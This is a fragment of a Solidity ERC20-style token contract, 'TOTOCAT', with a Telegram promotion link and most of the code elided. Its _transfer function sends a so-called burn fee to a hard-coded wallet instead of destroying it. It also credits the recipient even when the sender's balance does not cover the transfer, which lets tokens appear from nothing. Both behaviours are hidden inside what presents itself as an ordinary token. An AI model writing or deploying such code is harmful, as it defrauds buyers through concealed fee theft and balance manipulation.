...
// Submitted for Telegram: https://t.me/totocatbsc
...
contract  TOTOCAT  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x5605050e57aa11dB1896E84d6495898f90ce2748] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x5605050e57aa11dB1896E84d6495898f90ce2748, _bruntoken);
        }
